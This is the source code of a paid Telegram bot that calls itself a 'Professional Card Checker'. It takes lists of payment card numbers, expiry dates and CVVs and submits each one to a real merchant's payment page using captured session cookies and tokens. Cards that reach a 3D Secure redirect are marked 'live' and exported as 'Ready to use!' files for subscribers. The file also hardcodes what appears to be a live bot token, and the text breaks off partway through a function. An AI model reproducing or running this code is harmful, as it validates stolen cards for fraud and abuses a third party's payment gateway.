import logging
import asyncio
import io
import json
import os
import time
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, asdict
import sqlite3
import threading

import requests
from bs4 import BeautifulSoup
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
from telegram.ext import (
    ApplicationBuilder, ContextTypes, CommandHandler,
    MessageHandler, filters, CallbackQueryHandler
)

# Configuration
TOKEN = os.getenv("TOKEN", "8454654027:AAGF0kVGZlYTVs5qADs3zSwN3pmdH5rqNQ8")
ADMIN_ID = int(os.getenv("ADMIN_ID", "5895491379"))
PAYMENT_CONTACT = "@Bangladesh3456"
CHECK_DELAY = 8  # 8 seconds between checks (faster)
DATABASE_FILE = "bot_data.db"

# Subscription plans
SUBSCRIPTION_PLANS = {
    "1_hour": {"name": "1 Hour", "duration": 3600, "price": "Contact for price"},
    "1_day": {"name": "1 Day", "duration": 86400, "price": "Contact for price"},
    "1_week": {"name": "1 Week", "duration": 604800, "price": "Contact for price"},
    "1_month": {"name": "1 Month", "duration": 2592000, "price": "Contact for price"}
}

# Logging setup with better formatting
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Data classes
@dataclass
class UserSubscription:
    plan: str = ""
    expires_at: float = 0
    is_active: bool = False

@dataclass
class UserData:
    user_id: int
    username: str = ""
    subscription: UserSubscription = None
    cards: List[str] = None
    live_cards: List[str] = None
    current_index: int = 0
    is_checking: bool = False
    is_paused: bool = False
    status_message_id: Optional[int] = None
    total_checked: int = 0
    success_rate: float = 0.0
    last_activity: float = 0
    
    def __post_init__(self):
        if self.subscription is None:
            self.subscription = UserSubscription()
        if self.cards is None:
            self.cards = []
        if self.live_cards is None:
            self.live_cards = []
        if self.last_activity == 0:
            self.last_activity = time.time()

@dataclass
class BotStats:
    total_users: int = 0
    active_users: int = 0
    total_checks: int = 0
    total_live_cards: int = 0
    daily_checks: int = 0
    active_checkers: int = 0


class DatabaseManager:
    """Advanced database manager with SQLite for better performance"""
    
    def __init__(self, db_file: str = DATABASE_FILE):
        self.db_file = db_file
        self.lock = threading.Lock()
        self.init_database()
    
    def init_database(self):
        """Initialize database tables"""
        with sqlite3.connect(self.db_file) as conn:
            conn.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY,
                    username TEXT,
                    subscription_plan TEXT,
                    subscription_expires REAL,
                    subscription_active INTEGER,
                    total_checked INTEGER DEFAULT 0,
                    success_rate REAL DEFAULT 0.0,
                    last_activity REAL DEFAULT 0,
                    created_at REAL DEFAULT (strftime('%s', 'now'))
                )
            ''')
            
            conn.execute('''
                CREATE TABLE IF NOT EXISTS user_sessions (
                    user_id INTEGER PRIMARY KEY,
                    cards TEXT,
                    live_cards TEXT,
                    current_index INTEGER DEFAULT 0,
                    is_checking INTEGER DEFAULT 0,
                    is_paused INTEGER DEFAULT 0,
                    status_message_id INTEGER,
                    FOREIGN KEY (user_id) REFERENCES users (user_id)
                )
            ''')
            
            conn.execute('''
                CREATE TABLE IF NOT EXISTS bot_stats (
                    date TEXT PRIMARY KEY,
                    total_checks INTEGER DEFAULT 0,
                    total_live INTEGER DEFAULT 0,
                    active_users INTEGER DEFAULT 0
                )
            ''')
            
            conn.commit()
    
    def save_user(self, user_data: UserData):
        """Save user data to database"""
        with self.lock:
            with sqlite3.connect(self.db_file) as conn:
                # Save user info
                conn.execute('''
                    INSERT OR REPLACE INTO users 
                    (user_id, username, subscription_plan, subscription_expires, 
                     subscription_active, total_checked, success_rate, last_activity)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    user_data.user_id, user_data.username,
                    user_data.subscription.plan, user_data.subscription.expires_at,
                    int(user_data.subscription.is_active), user_data.total_checked,
                    user_data.success_rate, user_data.last_activity
                ))
                
                # Save session data
                conn.execute('''
                    INSERT OR REPLACE INTO user_sessions
                    (user_id, cards, live_cards, current_index, is_checking, 
                     is_paused, status_message_id)
                    VALUES (?, ?, ?, ?, ?, ?, ?)
                ''', (
                    user_data.user_id, json.dumps(user_data.cards),
                    json.dumps(user_data.live_cards), user_data.current_index,
                    int(user_data.is_checking), int(user_data.is_paused),
                    user_data.status_message_id
                ))
                
                conn.commit()
    
    def load_user(self, user_id: int) -> Optional[UserData]:
        """Load user data from database"""
        with self.lock:
            with sqlite3.connect(self.db_file) as conn:
                # Get user info
                user_row = conn.execute(
                    'SELECT * FROM users WHERE user_id = ?', (user_id,)
                ).fetchone()
                
                if not user_row:
                    return None
                
                # Get session data
                session_row = conn.execute(
                    'SELECT * FROM user_sessions WHERE user_id = ?', (user_id,)
                ).fetchone()
                
                subscription = UserSubscription(
                    plan=user_row[2] or "",
                    expires_at=user_row[3] or 0,
                    is_active=bool(user_row[4])
                )
                
                user_data = UserData(
                    user_id=user_row[0],
                    username=user_row[1] or "",
                    subscription=subscription,
                    total_checked=user_row[5] or 0,
                    success_rate=user_row[6] or 0.0,
                    last_activity=user_row[7] or time.time()
                )
                
                if session_row:
                    user_data.cards = json.loads(session_row[1] or "[]")
                    user_data.live_cards = json.loads(session_row[2] or "[]")
                    user_data.current_index = session_row[3] or 0
                    user_data.is_checking = bool(session_row[4])
                    user_data.is_paused = bool(session_row[5])
                    user_data.status_message_id = session_row[6]
                
                return user_data
    
    def get_all_users(self) -> List[UserData]:
        """Get all users from database"""
        users = []
        with sqlite3.connect(self.db_file) as conn:
            rows = conn.execute('SELECT user_id FROM users').fetchall()
            for row in rows:
                user = self.load_user(row[0])
                if user:
                    users.append(user)
        return users
    
    def get_bot_stats(self) -> BotStats:
        """Get bot statistics"""
        with sqlite3.connect(self.db_file) as conn:
            # Total users
            total_users = conn.execute('SELECT COUNT(*) FROM users').fetchone()[0]
            
            # Active users (activity in last 24 hours)
            day_ago = time.time() - 86400
            active_users = conn.execute(
                'SELECT COUNT(*) FROM users WHERE last_activity > ?', (day_ago,)
            ).fetchone()[0]
            
            # Total checks today
            today = datetime.now().strftime('%Y-%m-%d')
            stats_row = conn.execute(
                'SELECT total_checks, total_live FROM bot_stats WHERE date = ?', (today,)
            ).fetchone()
            
            daily_checks = stats_row[0] if stats_row else 0
            total_live_cards = stats_row[1] if stats_row else 0
            
            # Active checkers
            active_checkers = conn.execute(
                'SELECT COUNT(*) FROM user_sessions WHERE is_checking = 1'
            ).fetchone()[0]
            
            # Total checks overall
            total_checks = conn.execute(
                'SELECT SUM(total_checked) FROM users'
            ).fetchone()[0] or 0
            
            return BotStats(
                total_users=total_users,
                active_users=active_users,
                total_checks=total_checks,
                total_live_cards=total_live_cards,
                daily_checks=daily_checks,
                active_checkers=active_checkers
            )


class DataManager:
    """Enhanced data manager with caching and better performance"""
    
    def __init__(self):
        self.db = DatabaseManager()
        self.cache: Dict[int, UserData] = {}
        self.cache_timeout = 300  # 5 minutes
        self.last_cache_clear = time.time()
    
    def _clear_old_cache(self):
        """Clear old cache entries"""
        if time.time() - self.last_cache_clear > self.cache_timeout:
            self.cache.clear()
            self.last_cache_clear = time.time()
    
    def get_user(self, user_id: int, username: str = "") -> UserData:
        """Get or create user data with caching"""
        self._clear_old_cache()
        
        if user_id in self.cache:
            user_data = self.cache[user_id]
            user_data.username = username
            user_data.last_activity = time.time()
            return user_data
        
        user_data = self.db.load_user(user_id)
        if not user_data:
            user_data = UserData(user_id=user_id, username=username)
        else:
            user_data.username = username
        
        user_data.last_activity = time.time()
        self.cache[user_id] = user_data
        return user_data
    
    def save_user(self, user_data: UserData):
        """Save user data"""
        user_data.last_activity = time.time()
        self.cache[user_data.user_id] = user_data
        self.db.save_user(user_data)
    
    def is_subscription_active(self, user_id: int) -> bool:
        """Check if user has active subscription"""
        user_data = self.get_user(user_id)
        if not user_data.subscription.is_active:
            return False
        return datetime.now().timestamp() < user_data.subscription.expires_at
    
    def get_all_users(self) -> List[UserData]:
        """Get all users"""
        return self.db.get_all_users()
    
    def get_stats(self) -> BotStats:
        """Get bot statistics"""
        return self.db.get_bot_stats()


class CardChecker:
    """Enhanced card checker with better error handling"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0'
        })
        
        self.cookies = {
            '.AspNetCore.Antiforgery.ct0OCrh2AQg': 'CfDJ8BEkQ_pLnxxMoeoVdDo1mqfAjUWrV7x-otIGacRXJZlfNAtDRtbPqWyCSSVPB-M0ksvBWng7a7nqay-sQvT4rd2NJRQPiMLzUMd16BNnuh5iM4WliAkOsq9JUq10w0rVuR-B3u7aUfLU66N06D9Zlzo',
            'SERVERID': 'srv3_d9ef_136|aJsqV|aJsqH',
        }
        
        self.last_check = 0
        self.check_count = 0
        self.success_count = 0
    
    async def check_card(self, card: str) -> Tuple[bool, str]:
        """Check a single card - returns (is_live, status_message)"""
        try:
            card_parts = card.strip().split("|")
            if len(card_parts) != 4:
                return False, "Invalid format"
            
            number, month, year, cvv = card_parts
            
            # Validate card format
            if not (number.isdigit() and len(number) >= 13 and len(number) <= 19):
                return False, "Invalid card number"
            
            if not (month.isdigit() and 1 <= int(month) <= 12):
                return False, "Invalid month"
            
            if len(year) == 4:
                year = year[-2:]
            
            if not (year.isdigit() and len(year) == 2):
                return False, "Invalid year"
            
            if not (cvv.isdigit() and len(cvv) >= 3 and len(cvv) <= 4):
                return False, "Invalid CVV"
            
            # Rate limiting
            current_time = time.time()
            if current_time - self.last_check < 1:  # Minimum 1 second between requests
                await asyncio.sleep(1 - (current_time - self.last_check))
            
            data = {
                'DigitalWalletToken': '',
                'DigitalWallet': '',
                'CardNumber': number,
                'ExpiryMonth': month,
                'ExpiryYear': year,
                'CardHolderName': 'John Doe',
                'CVV': cvv,
                'PageSessionId': '6kKqDaerAMCo7o88E2DnsjJlvO5',
                'ITSBrowserScreenHeight': '1080',
                'ITSBrowserScreenWidth': '1920',
                'ITSBrowserScreenColorDepth': '24',
                'ITSBrowserTimeZoneOffset': '-180',
                'ITSBrowserHasJavaScript': 'true',
                'ITSBrowserHasJava': 'false',
                'ITSBrowserLanguage': 'en',
                '__RequestVerificationToken': 'CfDJ8BEkQ_pLnxxMoeoVdDo1mqf1YXYyijrfbV7QR8ut_XmcP5ujman4W6QH3JcSmorRBPLmd2PvzRvW-9Zn-X__dQnWRdlTPWDtyHeoG-XCrLV2X6RU5gI5dasMudnyOeqLNDKFaeXRyF-wz1sAP6oSsg4',
            }

            response = self.session.post(
                'https://ecommerce.its-connect.com/PayPage/Submit/6kKqDaerAMCo7o88E2DnsjJlvO5',
                cookies=self.cookies,
                data=data,
                timeout=25,
                allow_redirects=True
            )
            
            self.last_check = time.time()
            self.check_count += 1
            
            response_text = response.text.lower()
            soup = BeautifulSoup(response.text, 'html.parser')
            title = soup.title.string.strip().lower() if soup.title else ""

            # Enhanced detection for 3D Secure (Live cards)
            if ("acs authentication redirect page" in title or 
                "acs authentication redirect page" in response_text or
                "3d secure" in response_text or
                "authentication" in title):
                self.success_count += 1
                return True, "3D Secure ✅"
            
            # Check for other responses
            if "declined" in response_text or "invalid" in response_text:
                return False, "Declined ❌"
            elif "expired" in response_text:
                return False, "Expired ⏰"
            elif "insufficient" in response_text:
                return False, "Insufficient Funds 💰"
            else:
                return False, "Dead ❌"
                
        except requests.exceptions.Timeout:
            return False, "Timeout ⏰"
        except requests.exceptions.RequestException as e:
            logger.error(f"Request error for card {card}: {e}")
            return False, "Network Error 🌐"
        except Exception as e:
            logger.error(f"Error checking card {card}: {e}")
            return False, "Error ⚠️"
    
    def get_success_rate(self) -> float:
        """Get current success rate"""
        if self.check_count == 0:
            return 0.0
        return (self.success_count / self.check_count) * 100


class TelegramBot:
    """Enhanced Telegram bot with better admin interface"""
    
    def __init__(self):
        self.card_checker = CardChecker()
        self.data_manager = DataManager()
        self.checking_tasks: Dict[int, asyncio.Task] = {}
        self.start_time = time.time()
    
    def create_progress_bar(self, current: int, total: int, length: int = 20) -> str:
        """Create enhanced visual progress bar"""
        if total == 0:
            return "▫️" * length
        
        percentage = current / total
        done_length = int(length * percentage)
        remaining = length - done_length
        
        bar = "🟩" * done_length + "▫️" * remaining
        return f"{bar} {percentage:.1%}"
    
    def get_admin_keyboard(self) -> InlineKeyboardMarkup:
        """Enhanced admin panel keyboard"""
        keyboard = [
            [
                InlineKeyboardButton("👥 Users", callback_data="admin_users"),
                InlineKeyboardButton("📊 Stats", callback_data="admin_stats")
            ],
            [
                InlineKeyboardButton("💎 Add Sub", callback_data="admin_add_sub"),
                InlineKeyboardButton("🔍 Search User", callback_data="admin_search")
            ],
            [
                InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast"),
                InlineKeyboardButton("⚙️ Settings", callback_data="admin_settings")
            ],
            [
                InlineKeyboardButton("📈 Analytics", callback_data="admin_analytics"),
                InlineKeyboardButton("🔄 Refresh", callback_data="admin_panel")
            ],
            [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def get_subscription_keyboard(self) -> InlineKeyboardMarkup:
        """Get subscription plans keyboard"""
        keyboard = []
        for plan_id, plan_info in SUBSCRIPTION_PLANS.items():
            keyboard.append([
                InlineKeyboardButton(
                    f"🔥 {plan_info['name']} - {plan_info['price']}", 
                    callback_data=f"sub_{plan_id}"
                )
            ])
        
        keyboard.append([InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")])
        return InlineKeyboardMarkup(keyboard)
    
    def get_main_menu_keyboard(self, user_data: UserData) -> InlineKeyboardMarkup:
        """Get main menu keyboard"""
        keyboard = []
        
        if self.data_manager.is_subscription_active(user_data.user_id):
            keyboard.extend([
                [InlineKeyboardButton("📋 Add Combo", callback_data="add_cards")],
                [InlineKeyboardButton("▶️ Start Check", callback_data="start_check")],
                [InlineKeyboardButton("📊 Results", callback_data="view_results")],
                [InlineKeyboardButton("📥 Download", callback_data="download")],
                [InlineKeyboardButton("🗑 Clear Data", callback_data="clear_data")]
            ])
        else:
            keyboard.append([InlineKeyboardButton("💎 Subscriptions", callback_data="subscription")])
        
        keyboard.append([InlineKeyboardButton("ℹ️ Account Info", callback_data="account_info")])
        
        # Admin access
        if user_data.user_id == ADMIN_ID:
            keyboard.append([InlineKeyboardButton("🔧 Admin Panel", callback_data="admin_panel")])
        
        return InlineKeyboardMarkup(keyboard)
    
    def get_checking_keyboard(self, is_paused: bool) -> InlineKeyboardMarkup:
        """Get checking control keyboard"""
        keyboard = []
        
        if is_paused:
            keyboard.append([InlineKeyboardButton("▶️ Resume", callback_data="resume")])
        else:
            keyboard.append([InlineKeyboardButton("⏸️ Pause", callback_data="pause")])
        
        keyboard.extend([
            [InlineKeyboardButton("⏹️ Stop Check", callback_data="stop_check")],
            [InlineKeyboardButton("📊 Results", callback_data="view_results")],
            [InlineKeyboardButton("🔄 Refresh", callback_data="refresh_status")]
        ])
        
        return InlineKeyboardMarkup(keyboard)
    
    async def send_admin_panel(self, context: ContextTypes.DEFAULT_TYPE, 
                              chat_id: int, message_id: int = None):
        """Send enhanced admin panel"""
        if chat_id != ADMIN_ID:
            return
        
        stats = self.data_manager.get_stats()
        uptime = time.time() - self.start_time
        uptime_str = str(timedelta(seconds=int(uptime)))
        
        text = (
            f"🔧 **ADMIN PANEL**\n\n"
            f"📊 **Bot Statistics:**\n"
            f"├ Total Users: **{stats.total_users}**\n"
            f"├ Active Users (24h): **{stats.active_users}**\n"
            f"├ Active Checkers: **{stats.active_checkers}**\n"
            f"├ Total Checks: **{stats.total_checks:,}**\n"
            f"├ Daily Checks: **{stats.daily_checks:,}**\n"
            f"├ Total Live Cards: **{stats.total_live_cards:,}**\n"
            f"└ Bot Uptime: **{uptime_str}**\n\n"
            f"🎯 **Success Rate:** {self.card_checker.get_success_rate():.1f}%\n"
            f"⚡ **Performance:** {len(self.checking_tasks)} active sessions\n\n"
            f"🔥 **Choose an action:**"
        )
        
        try:
            if message_id:
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_id,
                    text=text,
                    parse_mode="Markdown",
                    reply_markup=self.get_admin_keyboard()
                )
            else:
                await context.bot.send_message(
                    chat_id,
                    text,
                    parse_mode="Markdown",
                    reply_markup=self.get_admin_keyboard()
                )
        except Exception as e:
            logger.error(f"Error sending admin panel: {e}")
    
    async def send_main_menu(self, context: ContextTypes.DEFAULT_TYPE, 
                           chat_id: int, message_id: int = None):
        """Send main menu"""
        user_data = self.data_manager.get_user(chat_id, "")
        
        # Check subscription status
        is_active = self.data_manager.is_subscription_active(chat_id)
        
        if is_active:
            expires_at = datetime.fromtimestamp(user_data.subscription.expires_at)
            time_left = expires_at - datetime.now()
            if time_left.total_seconds() > 3600:
                status_text = f"✅ Active ({int(time_left.total_seconds()//3600)}h left)"
            else:
                status_text = f"✅ Active ({int(time_left.total_seconds()//60)}m left)"
        else:
            status_text = "❌ Inactive"
        
        success_rate = 0
        if user_data.current_index > 0:
            success_rate = (len(user_data.live_cards) / user_data.current_index) * 100
        
        text = (
            f"🤖 **Professional Card Checker Bot**\n\n"
            f"👤 **User:** {user_data.username or 'Unknown'}\n"
            f"📊 **Subscription:** {status_text}\n"
            f"📋 **Loaded Cards:** {len(user_data.cards):,}\n"
            f"✅ **Live Cards:** {len(user_data.live_cards):,}\n"
            f"🔍 **Progress:** {user_data.current_index:,}/{len(user_data.cards):,}\n"
            f"📈 **Success Rate:** {success_rate:.1f}%\n\n"
            f"🎯 **Choose an option:**"
        )
        
        keyboard = self.get_main_menu_keyboard(user_data)
        
        try:
            if message_id:
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_id,
                    text=text,
                    parse_mode="Markdown",
                    reply_markup=keyboard
                )
            else:
                await context.bot.send_message(
                    chat_id,
                    text,
                    parse_mode="Markdown",
                    reply_markup=keyboard
                )
        except Exception as e:
            logger.error(f"Error sending main menu: {e}")
    
    async def update_checking_status(self, context: ContextTypes.DEFAULT_TYPE, 
                                   chat_id: int, user_data: UserData):
        """Update checking status message with enhanced info"""
        if not user_data.status_message_id:
            return
        
        progress_bar = self.create_progress_bar(user_data.current_index, len(user_data.cards))
        remaining = len(user_data.cards) - user_data.current_index
        
        # Calculate estimated time
        if user_data.current_index > 0:
            estimated_seconds = remaining * CHECK_DELAY
            estimated_time = str(timedelta(seconds=int(estimated_seconds)))
        else:
            estimated_time = "Calculating..."
        
        # Calculate speed
        if user_data.current_index > 0:
            speed = f"{CHECK_DELAY}s per card"
        else:
            speed = "Starting..."
        
        text = (
            f"🔍 **CHECKING IN PROGRESS**\n\n"
            f"📊 **Progress:** {progress_bar}\n\n"
            f"✅ **Live Cards:** **{len(user_data.live_cards):,}**\n"
            f"🔍 **Checked:** **{user_data.current_index:,}**\n"
            f"⏳ **Remaining:** **{remaining:,}**\n"
            f"📋 **Total:** **{len(user_data.cards):,}**\n\n"
            f"⚡ **Speed:** {speed}\n"
            f"🕐 **Est. Time:** {estimated_time}\n"
            f"📈 **Success Rate:** {(len(user_data.live_cards)/max(user_data.current_index,1)*100):.1f}%\n\n"
            f"**Status:** {'⏸️ PAUSED' if user_data.is_paused else '▶️ RUNNING'}"
        )
        
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=user_data.status_message_id,
                text=text,
                parse_mode="Markdown",
                reply_markup=self.get_checking_keyboard(user_data.is_paused)
            )
        except Exception as e:
            logger.warning(f"Failed to update status: {e}")
    
    async def run_checker(self, context: ContextTypes.DEFAULT_TYPE, chat_id: int):
        """Enhanced checking loop with better performance"""
        user_data = self.data_manager.get_user(chat_id, "")
        last_save = time.time()
        
        while (user_data.current_index < len(user_data.cards) and 
               user_data.is_checking and
               self.data_manager.is_subscription_active(chat_id)):
            
            if user_data.is_paused:
                await asyncio.sleep(2)
                continue
            
            card = user_data.cards[user_data.current_index]
            
            # Check card with status
            is_live, status = await self.card_checker.check_card(card)
            
            if is_live:
                user_data.live_cards.append(card)
                # Send live card immediately with enhanced format
                await context.bot.send_message(
                    chat_id,
                    f"🎉 **LIVE CARD FOUND!**\n\n"
                    f"💳 `{card}`\n"
                    f"🔥 **Status:** {status}\n"
                    f"📊 **Card #{len(user_data.live_cards)}**\n"
                    f"⚡ **Found at:** {datetime.now().strftime('%H:%M:%S')}",
                    parse_mode="Markdown"
                )
            
            user_data.current_index += 1
            user_data.total_checked += 1
            
            # Update success rate
            if user_data.current_index > 0:
                user_data.success_rate = (len(user_data.live_cards) / user_data.current_index) * 100
            
            # Update status every 5 cards or every 30 seconds
            current_time = time.time()
            if (user_data.current_index % 5 == 0 or 
                current_time - last_save > 30):
                await self.update_checking_status(context, chat_id, user_data)
                self.data_manager.save_user(user_data)
                last_save = current_time
            
            # Wait between checks
            await asyncio.sleep(CHECK_DELAY)
        
        # Checking completed or stopped
        user_data.is_checking = False
        self.data_manager.save_user(user_data)
        
        if user_data.current_index >= len(user_data.cards):
            # Send completion message with detailed stats
            completion_time = datetime.now().strftime('%H:%M:%S')
            total_time = (user_data.current_index * CHECK_DELAY) / 60  # in minutes
            
            await context.bot.send_message(
                chat_id,
                f"✅ **CHECKING COMPLETED!**\n\n"
                f"📊 **Final Results:**\n"
                f"├ Total Cards: **{len(user_data.cards):,}**\n"
                f"├ Live Cards: **{len(user_data.live_cards):,}**\n"
                f"├ Dead Cards: **{user_data.current_index - len(user_data.live_cards):,}**\n"
                f"├ Success Rate: **{user_data.success_rate:.1f}%**\n"
                f"├ Total Time: **{total_time:.1f} minutes**\n"
                f"└ Completed at: **{completion_time}**\n\n"
                f"🎉 **Great job! Check your results below.**",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("📊 View Results", callback_data="view_results")],
                    [InlineKeyboardButton("📥 Download Files", callback_data="download")],
                    [InlineKeyboardButton("🔄 New Check", callback_data="add_cards")]
                ])
            )
        
        # Remove task
        if chat_id in self.checking_tasks:
            del self.checking_tasks[chat_id]
    
    async def send_results_files(self, context: ContextTypes.DEFAULT_TYPE, chat_id: int):
        """Send enhanced result files"""
        user_data = self.data_manager.get_user(chat_id, "")
        
        if not user_data.live_cards:
            await context.bot.send_message(
                chat_id, 
                "ℹ️ **No live cards found to download.**",
                parse_mode="Markdown"
            )
            return
        
        try:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            
            # Create live cards file with enhanced format
            live_content = []
            live_content.append(f"💳 LIVE CARDS REPORT")
            live_content.append(f"📅 Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            live_content.append(f"👤 User: {user_data.username}")
            live_content.append(f"📊 Total Live: {len(user_data.live_cards)}")
            live_content.append(f"📈 Success Rate: {user_data.success_rate:.1f}%")
            live_content.append("=" * 50)
            live_content.append("")
            
            for i, card in enumerate(user_data.live_cards, 1):
                live_content.append(f"{i:03d}. {card}")
            
            live_file_content = "\n".join(live_content)
            
            # Send live cards file
            await context.bot.send_document(
                chat_id,
                io.StringIO(live_file_content),
                filename=f"live_cards_{timestamp}.txt",
                caption=f"✅ **Live Cards ({len(user_data.live_cards)})** 🔥\n\n"
                       f"📊 Success Rate: **{user_data.success_rate:.1f}%**\n"
                       f"📅 Generated: {datetime.now().strftime('%H:%M:%S')}",
                parse_mode="Markdown"
            )
            
            # Also create a simple format file
            simple_content = "\n".join(user_data.live_cards)
            await context.bot.send_document(
                chat_id,
                io.StringIO(simple_content),
                filename=f"live_cards_simple_{timestamp}.txt",
                caption="💳 **Simple Format** - Ready to use!",
                parse_mode="Markdown"
            )
                
        except Exception as e:
            logger.error(f"Error sending files: {e}")
            await context.bot.send_message(
                chat_id, 
                "❌ **Error sending files. Please try again.**",
                parse_mode="Markdown"
            )
    
    async def send_user_list(self, context: ContextTypes.DEFAULT_TYPE, 
                           chat_id: int, message_id: int = None, page: int = 0):
        """Send paginated user list for admin"""
        if chat_id != ADMIN_ID:
            return
        
        users = self.data_manager.get_all_users()
        users.sort(key=lambda x: x.last_activity, reverse=True)
        
        per_page = 10
        total_pages = (len(users) + per_page - 1) // per_page
        start_idx = page * per_page
        end_idx = min(start_idx + per_page, len(users))
        
        text = f"👥 **USER LIST** (Page {page + 1}/{total_pages})\n\n"
        
        for i, user in enumerate(users[start_idx:end_idx], start_idx + 1):
            is_active = self.data_manager.is_subscription_active(user.user_id)
            status = "🟢" if is_active else "🔴"
            last_seen = datetime.fromtimestamp(user.last_activity).strftime('%m/%d %H:%M')
            
            text += (f"{i:02d}. {status} `{user.user_id}`\n"
                    f"    👤 @{user.username or 'Unknown'}\n"
                    f"    📊 {len(user.live_cards)} live | {user.total_checked} checked\n"
                    f"    🕐 Last: {last_seen}\n\n")
        
        # Pagination keyboard
        keyboard = []
        nav_row = []
        
        if page > 0:
            nav_row.append(InlineKeyboardButton("◀️ Previous", callback_data=f"admin_users_{page-1}"))
        if page < total_pages - 1:
            nav_row.append(InlineKeyboardButton("Next ▶️", callback_data=f"admin_users_{page+1}"))
        
        if nav_row:
            keyboard.append(nav_row)
        
        keyboard.extend([
            [InlineKeyboardButton("🔍 Search User", callback_data="admin_search")],
            [InlineKeyboardButton("🔧 Admin Panel", callback_data="admin_panel")]
        ])
        
        try:
            if message_id:
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_id,
                    text=text,
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )
            else:
                await context.bot.send_message(
                    chat_id,
                    text,
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )
        except Exception as e:
            logger.error(f"Error sending user list: {e}")
    
    # Command Handlers
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Enhanced start command"""
        chat_id = update.effective_chat.id
        username = update.effective_user.username or ""
        
        user_data = self.data_manager.get_user(chat_id, username)
        self.data_manager.save_user(user_data)
        
        welcome_text = (
            f"🚀 **Welcome to Professional Card Checker Bot!**\n\n"
            f"🔥 **Features:**\n"
            f"├ Professional card validation\n"
            f"├ Lightning fast checking (8s per card)\n"
            f"├ Advanced 3D Secure detection\n"
            f"├ Real-time live card notifications\n"
            f"├ Detailed statistics & analytics\n"
            f"├ Multiple subscription plans\n"
            f"└ Premium user experience\n\n"
            f"📞 **For subscription:** {PAYMENT_CONTACT}\n\n"
            f"💳 **Card Format:**\n"
            f"`Number|MM|YYYY|CVV`\n"
            f"**Example:** `4532123456789012|12|2025|123`\n\n"
            f"🎯 **Ready to start? Choose an option below!**"
        )
        
        await update.message.reply_text(
            welcome_text,
            parse_mode="Markdown",
            reply_markup=self.get_main_menu_keyboard(user_data)
        )
    
    async def admin_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Enhanced admin command"""
        if update.effective_user.id != ADMIN_ID:
            await update.message.reply_text("❌ **Access denied.**", parse_mode="Markdown")
            return
        
        if not context.args:
            await self.send_admin_panel(context, update.effective_chat.id)
            return
        
        if len(context.args) < 3:
            await update.message.reply_text(
                "📋 **Admin Usage:**\n\n"
                "`/admin <user_id> <plan> <hours>`\n"
                "**Example:** `/admin 123456789 1_day 24`\n\n"
                "**Available plans:**\n"
                + "\n".join([f"• `{plan_id}` - {info['name']}" 
                           for plan_id, info in SUBSCRIPTION_PLANS.items()]),
                parse_mode="Markdown"
            )
            return
        
        try:
            user_id = int(context.args[0])
            plan = context.args[1]
            hours = int(context.args[2])
            
            if plan not in SUBSCRIPTION_PLANS:
                await update.message.reply_text(
                    f"❌ **Invalid plan!**\n\nAvailable plans: {', '.join(SUBSCRIPTION_PLANS.keys())}",
                    parse_mode="Markdown"
                )
                return
            
            # Set subscription
            user_data = self.data_manager.get_user(user_id, "")
            user_data.subscription.plan = plan
            user_data.subscription.expires_at = datetime.now().timestamp() + (hours * 3600)
            user_data.subscription.is_active = True
            
            self.data_manager.save_user(user_data)
            
            # Notify user
            plan_name = SUBSCRIPTION_PLANS[plan]["name"]
            expires_at = datetime.fromtimestamp(user_data.subscription.expires_at)
            
            try:
                await context.bot.send_message(
                    user_id,
                    f"🎉 **SUBSCRIPTION ACTIVATED!**\n\n"
                    f"📦 **Plan:** {plan_name}\n"
                    f"⏰ **Expires:** {expires_at.strftime('%Y-%m-%d %H:%M')}\n"
                    f"⚡ **Duration:** {hours} hours\n\n"
                    f"✅ **You can now use the bot!** 🚀\n\n"
                    f"Start by adding your combo and begin checking!",
                    parse_mode="Markdown"
                )
            except:
                pass
            
            await update.message.reply_text(
                f"✅ **Subscription activated successfully!**\n\n"
                f"👤 **User:** `{user_id}`\n"
                f"📦 **Plan:** {plan_name}\n"
                f"⏰ **Duration:** {hours} hours\n"
                f"📅 **Expires:** {expires_at.strftime('%Y-%m-%d %H:%M')}",
                parse_mode="Markdown"
            )
            
        except ValueError:
            await update.message.reply_text(
                "❌ **Invalid user ID or duration!**\n\nMake sure to use numbers only.",
                parse_mode="Markdown"
            )
        except Exception as e:
            await update.message.reply_text(f"❌ **Error:** {e}", parse_mode="Markdown")
    
    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Bot statistics command"""
        if update.effective_user.id != ADMIN_ID:
            return
        
        stats = self.data_manager.get_stats()
        uptime = time.time() - self.start_time
        uptime_str = str(timedelta(seconds=int(uptime)))
        
        text = (
            f"📊 **BOT STATISTICS**\n\n"
            f"👥 **Users:**\n"
            f"├ Total: **{stats.total_users:,}**\n"
